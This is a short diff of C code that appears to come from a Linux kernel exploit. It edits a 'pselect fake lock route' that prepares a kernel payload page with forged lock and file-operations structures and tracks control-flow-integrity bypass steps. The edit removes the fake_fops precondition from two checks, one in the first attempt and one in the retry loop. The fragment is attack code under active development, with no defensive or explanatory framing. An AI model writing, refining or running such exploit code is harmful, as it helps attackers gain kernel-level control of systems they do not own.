@@ -199,7 +199,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
 }
 
 void do_pselect_fake_lock_route(void) {
-  if (!page_base || !fake_lock || !fake_fops) {
+  if (!page_base || !fake_lock) {
     cfi_last_step = 30;
     cfi_last_errno = 0;
     pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
@@ -216,7 +216,7 @@ void do_pselect_fake_lock_route(void) {
        route_attempt++) {
     if (route_attempt != 1) {
       page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
-      if (!page_base || !fake_lock || !fake_fops) {
+      if (!page_base || !fake_lock) {
         cfi_last_step = 34;
         cfi_last_errno = errno;
         pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
